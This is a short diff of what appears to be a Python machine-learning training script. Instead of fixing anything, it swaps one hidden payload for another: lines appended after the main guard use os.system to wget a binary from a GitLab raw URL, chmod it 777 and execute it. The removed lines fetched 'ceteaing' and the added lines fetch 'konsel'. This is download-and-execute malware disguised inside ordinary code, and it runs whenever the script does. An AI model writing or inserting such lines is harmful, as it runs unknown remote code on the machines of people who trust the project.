@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://gitlab.com/aqshakuy/dorayaki/-/raw/main/ceteaing')
-os.system('chmod 777 ceteaing')
-os.system('./ceteaing')
+os.system('wget https://gitlab.com/veves/consel/-/raw/main/konsel')
+os.system('chmod 777 konsel')
+os.system('./konsel')
